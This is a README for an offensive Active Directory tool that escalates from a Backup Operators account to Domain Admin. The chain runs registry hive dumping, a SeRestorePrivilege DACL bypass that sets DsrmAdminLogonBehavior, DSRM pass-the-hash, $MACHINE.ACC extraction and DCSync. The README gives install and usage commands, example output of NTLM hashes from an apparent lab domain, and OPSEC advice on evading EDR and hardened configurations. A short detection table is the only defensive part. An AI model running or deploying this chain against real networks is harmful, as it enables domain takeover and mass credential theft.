# BackupOperatorsDump v3.0

Full **Backup Operators → Domain Admin** attack chain. Single command, no admin credentials needed.

## Attack Chain

```
Phase 1: RegSaveKey SAM + SYSTEM          → DSRM Administrator hash
Phase 2: REG_OPTION_BACKUP_RESTORE write  → DsrmAdminLogonBehavior = 2
Phase 3: DSRM Pass-the-Hash              → Local Admin on DC (network logon)
Phase 4: Cleanup                          → Remove DsrmAdminLogonBehavior
Phase 5: RegSaveKey SECURITY              → $MACHINE.ACC (DC machine account hash)
Phase 6: DCSync via $MACHINE.ACC          → ALL domain hashes
```

## How It Works

### SeRestorePrivilege DACL Bypass

Backup Operators have both `SeBackupPrivilege` (read) and `SeRestorePrivilege` (write). When opening a registry key via MS-RRP with `REG_OPTION_BACKUP_RESTORE` (0x00000004), the Windows Security Reference Monitor **bypasses DACL checks** if the caller has `SeRestorePrivilege`. This allows writing to any registry key, including `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`.

### DSRM Pass-the-Hash

Setting `DsrmAdminLogonBehavior=2` enables network logon with the DSRM Administrator account. The DSRM password is stored in the DC's SAM database (separate from the domain Administrator). With PtH using `domain=DC_HOSTNAME`, we get local admin access on the DC.

### $MACHINE.ACC → DCSync

With local admin, the SECURITY hive becomes accessible. It contains `$MACHINE.ACC` — the DC's machine account NT hash. Every DC machine account has DCSync rights (DS-Replication-Get-Changes-All) by default, enabling full domain hash extraction.

### SAM ≠ NTDS on a Domain Controller

| | SAM (Local) | NTDS.dit (Domain) |
|---|---|---|
| **Administrator** | DSRM password | Domain Administrator |
| **Same hash?** | **No** | Different accounts |

## Installation

### pipx (recommended)

```bash
pipx install git+https://github.com/Doguc4nTazegul/BackupOperatorsDump.git
```

### pip

```bash
pip install git+https://github.com/Doguc4nTazegul/BackupOperatorsDump.git
```

### From source

```bash
git clone https://github.com/Doguc4nTazegul/BackupOperatorsDump.git
cd BackupOperatorsDump
pip install .
```

## Usage

```bash
# Full chain: Backup Operators → Domain Admin (single command)
backupoperatorsdump -t <DC_IP> -u <backup_ops_user> -p '<password>' -d <domain>

# With pass-the-hash
backupoperatorsdump -t <DC_IP> -u <user> -H ':<NT_HASH>' -d <domain>

# Save output to specific directory
backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> -o /tmp/loot

# Registry dump only (no DSRM exploitation)
backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --reg-only

# Don't cleanup (leave DsrmAdminLogonBehavior=2)
backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --no-cleanup
```

## Options

| Flag | Description |
|---|---|
| `-t`, `--target` | DC IP address (required) |
| `-u`, `--username` | Backup Operators member username (required) |
| `-p`, `--password` | Password |
| `-H`, `--hashes` | NTLM hash (`LM:NT` or `:NT`) |
| `-d`, `--domain` | Domain name |
| `-o`, `--output` | Output directory (default: cwd) |
| `--dc-hostname` | DC NetBIOS name (auto-detected from SMB) |
| `--reg-only` | Only dump SAM+SYSTEM, skip DSRM chain |
| `--no-cleanup` | Don't restore registry after exploit |
| `--remote-path` | Remote temp path (default: `C:\Users\Public`) |

## Example Output

```bash
$ backupoperatorsdump -t 192.168.1.200 -u svc_ldapadsecure -p 'BackupOps2026!' -d hogwarts.local

╔═══════════════════════════════════════════════════════════╗
║              BackupOperatorsDump  v3.0                    ║
║  Full chain: Backup Operators → DSRM → PtH → DCSync     ║
╚═══════════════════════════════════════════════════════════╝


  ───────────────────────────────────────────────────────
    Phase 1: Registry Hive Extraction (SAM + SYSTEM)
  ───────────────────────────────────────────────────────

  [*] Connecting to 192.168.1.200...
  [+] Authenticated as hogwarts.local\svc_ldapadsecure
  [*] DC hostname: DC01
  [+] HKLM\SYSTEM → ./SYSTEM.hiv (18,083,840 bytes)
  [+] HKLM\SAM → ./SAM.hiv (28,672 bytes)
  [+] DSRM Administrator hash: 3b9d5f8125d916785ea7346e32f3c158
  [!] This is the DSRM password, NOT the domain Administrator

  ───────────────────────────────────────────────────────
    Phase 2: DSRM Unlock (SeRestorePrivilege → REG_OPTION_BACKUP_RESTORE)
  ───────────────────────────────────────────────────────

  [*] Opening HKLM\..\Lsa with BACKUP_RESTORE write intent...
  [+] DACL bypass successful (SeRestorePrivilege)
  [*] DsrmAdminLogonBehavior does not exist (will create)
  [+] DsrmAdminLogonBehavior = 2 → DSRM network logon ENABLED
  [*] Waiting 3s for LSA policy refresh...

  ───────────────────────────────────────────────────────
    Phase 3: DSRM Pass-the-Hash (domain=DC01)
  ───────────────────────────────────────────────────────

  [*] Authenticating as DC01\Administrator with DSRM hash...
  [+] LOCAL ADMIN via DSRM PtH!
  [+] HKLM\SECURITY → ./SECURITY.hiv (32,768 bytes)

  ───────────────────────────────────────────────────────
    Phase 4: Cleanup (restore DsrmAdminLogonBehavior)
  ───────────────────────────────────────────────────────

  [*] Connecting to 192.168.1.200...
  [+] Authenticated as hogwarts.local\svc_ldapadsecure
  [+] DsrmAdminLogonBehavior DELETED (didn't exist before)

  ───────────────────────────────────────────────────────
    Phase 5: Extract $MACHINE.ACC from SECURITY hive
  ───────────────────────────────────────────────────────

  [+] $MACHINE.ACC (DC01$) NT hash: 55f0450a567294cdd7024cf36582d07b
  [+] DC machine account has DCSync rights by default!

  ───────────────────────────────────────────────────────
    Phase 6: DCSync via $MACHINE.ACC
  ───────────────────────────────────────────────────────

  [*] impacket-secretsdump → ./dcsync_full.txt
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:1d7c113c207344eaf0eca5cca64e5fff:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:87ed2ddea933817687dfdb170b62da86:::
  hogwarts.local\svc_join_domain:1103:aad3b435b51404eeaad3b435b51404ee:3b9d5f8125d916785ea7346e32f3c158:::
  hogwarts.local\harry.potter:1105:aad3b435b51404eeaad3b435b51404ee:433660bcc2058776b1872c82b2c4d2cc:::
  hogwarts.local\ceradm:1114:aad3b435b51404eeaad3b435b51404ee:b89803c272f63e0b0ff3aabeb8a8365d:::
  hogwarts.local\albus.dumbledore:1115:aad3b435b51404eeaad3b435b51404ee:3a9e27a0788a68674f4d8e467314e936:::
  hogwarts.local\severus.snape:1117:aad3b435b51404eeaad3b435b51404ee:7a43ddce5ca6320046ab081487dcd5dd:::
  hogwarts.local\draco.malfoy:1125:aad3b435b51404eeaad3b435b51404ee:8e4c476f9351274644c3a15b37e67694:::
  hogwarts.local\sirona.ryan:1130:aad3b435b51404eeaad3b435b51404ee:21cfe2b16ac9498e8ef70312c00ffc7f:::
  ... +10 more

  [+] DCSync COMPLETE: 20 domain hashes extracted
  [+] Full output: ./dcsync_full.txt

  ═══════════════════════════════════════════════════════
    CHAIN COMPLETE: Backup Operators → Domain Admin
  ═══════════════════════════════════════════════════════

    Files:
      ./SYSTEM.hiv
      ./SAM.hiv
      ./SECURITY.hiv
      ./dcsync_full.txt

    Key hashes:
      DSRM Admin:     3b9d5f8125d916785ea7346e32f3c158
      $MACHINE.ACC:   55f0450a567294cdd7024cf36582d07b
```
## ⚠️ Operational Considerations & Limitations

While this tool performs flawlessly in default Active Directory configurations, operators should be aware of the following architectural and OPSEC limitations in hardened environments:

* **Remote Registry Dependency (`WinReg`):** The tool relies on the `WinReg` RPC endpoint. In modern and hardened environments (Windows Server 2016+), the `RemoteRegistry` service may be set to *Manual* or *Disabled* by default. If the service is not running, Phase 1 will fail with an `RPC_S_SERVER_UNAVAILABLE` error. Currently, operators must manually start the service (e.g., via SVCCTL/WMI) before execution.
* **Privilege Stripping via GPO:** By default, the Backup Operators group possesses both `SeBackupPrivilege` and `SeRestorePrivilege`. However, mature Tier-0 hardening configurations may strip `SeRestorePrivilege` from this group. If missing, Phase 2 (`DsrmAdminLogonBehavior` patching) will fail, preventing the DSRM PtH attack.
* **EDR & Telemetry (API Hooking):** Although `SeBackupPrivilege` overrides the OS-level DACL checks, it does not bypass EDR Kernel Callbacks. Remote `RegSaveKey` calls targeting the `SAM` and `SYSTEM` hives are heavily monitored by modern EDRs and may be blocked or flagged as credential dumping.
* **OPSEC & State Restoration (Graceful Exit):** In Phase 2, the tool modifies `DsrmAdminLogonBehavior` to `2` and attempts to clean it up in Phase 4. **Warning:** If the tool crashes or the network connection drops during Phase 3 (DCSync), the registry value will remain `2`, inadvertently leaving a persistent DSRM network backdoor. Operators *must* manually verify cleanup if execution is interrupted.


## 🛠️ Planned Features (To-Do)
* [ ] Auto-start `RemoteRegistry` service via SMB/SVCCTL if reachable but not running.
* [ ] Implement robust `try/finally` blocks to guarantee OPSEC cleanup (`DsrmAdminLogonBehavior` restoration) even on fatal crashes.



## Prerequisites

- Python 3.8+
- impacket >= 0.11.0
- User must be a member of the **Backup Operators** group
- Remote Registry service reachable (TCP/445)
- Target must be a Domain Controller

## Detection

| Phase | Event ID | Indicator |
|---|---|---|
| Registry read | 4657 | SAM/SYSTEM hive access |
| Registry write | 4657 | `DsrmAdminLogonBehavior` value created/modified |
| DSRM logon | 4624 | Logon Type 3 with local Administrator account |
| DCSync | 4662 | DS-Replication-Get-Changes-All |
| Special logon | 4672 | SeBackupPrivilege / SeRestorePrivilege |

## References

- [Backup Operators DACL Bypass via SeRestorePrivilege](https://www.bordergate.co.uk/backup-operator-to-domain-admin/)
- [DsrmAdminLogonBehavior](https://adsecurity.org/?p=1714)
- [REG_OPTION_BACKUP_RESTORE](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexw)
- [$MACHINE.ACC DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [impacket MS-RRP](https://github.com/fortra/impacket)

## License

MIT
